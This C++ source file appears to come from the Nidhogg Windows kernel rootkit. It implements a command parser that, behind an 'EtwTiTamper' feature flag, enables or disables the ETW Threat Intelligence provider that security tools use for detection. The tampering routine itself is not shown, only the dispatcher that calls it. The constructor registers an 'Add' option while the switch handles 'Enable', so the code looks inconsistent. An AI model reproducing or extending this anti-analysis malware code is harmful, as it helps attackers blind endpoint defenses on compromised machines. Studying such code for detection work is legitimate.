#include "pch.h"
#include "EtwTiParser.h"
#include "AntiAnalysis.hpp"

EtwTiParser::EtwTiParser() {
	this->optionsSize = 2;
	this->options = (OptionMetadata*)AllocateMemory(this->optionsSize * sizeof(OptionMetadata));

	if (!this->options)
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	this->options[0] = { Options::Add, { 0, {} } };
	this->options[1] = { Options::Remove, { 0, {} } };
}

/*
* Description:
* Execute is responsible for executing a command and returning its value.
*
* Parameters:
* @commandId [Options]  -- Command to run.
* @args		 [PVOID*]	-- Array of args to send to the command.
*
* Returns:
* @status	 [NTSTATUS] -- Result of the command.
*/
NTSTATUS EtwTiParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
	UNREFERENCED_PARAMETER(args);

	NTSTATUS status = STATUS_SUCCESS;

	if (!Features.EtwTiTamper)
		return STATUS_UNSUCCESSFUL;

	switch (commandId) {
	case Options::Enable:
	{
		status = NidhoggAntiAnalysis->EnableDisableEtwTI(true);
		break;
	}
	case Options::Remove:
	{
		status = NidhoggAntiAnalysis->EnableDisableEtwTI(false);
		break;
	}
	default:
	{
		status = STATUS_NOT_IMPLEMENTED;
		break;
	}
	}

	return status;
}
